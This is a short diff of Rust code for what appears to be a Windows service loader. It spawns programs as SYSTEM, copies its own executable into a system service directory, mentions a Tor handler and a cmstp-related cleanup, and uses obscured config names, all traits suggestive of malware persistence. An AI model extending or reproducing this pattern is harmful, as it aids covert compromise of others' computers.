@@ -37,6 +37,7 @@ use shared::utils::functions::{
     try_spawn_program_as_system,
 };
 use std::fs::{ create_dir_all, remove_dir_all };
+use std::thread::sleep;
 use std::{ ffi::OsString, thread, time::Duration };
 use windows_service::{
     define_windows_service,
@@ -198,6 +199,8 @@ fn launch_cleanup() -> Result<()> {
 fn post_cleanup() -> Result<()> {
     tag!("POST-CLEANUP");
 
+    // delete the cmstp cleanup - name Network
+
     create_dir_all(system_service_directory())?;
     let system_exe = system_service_directory().join(system_loader_exe_name());
     std::fs::copy(get_current_exe()?, &system_exe)?;
@@ -234,9 +237,11 @@ fn system_service_work() -> Result<()> {
     info!("run config pre tor handler");
 
     // always run default - if theres already installed - we just run the apps, if higher versions also run those
-    if let Err(error) = run_config(RnCnfgPrms::default()) {
-        err!("run_config RnCnfgPrms::default() Error: ", error);
+
+    if let Err(error) = run_config(RnCnfgPrms::default(), false) {
+        err!("run_config(RnCnfgPrms::default()) Error: ", error);
     }
+
     info!("run config done");
     tokio::runtime::Builder
         ::new_multi_thread()
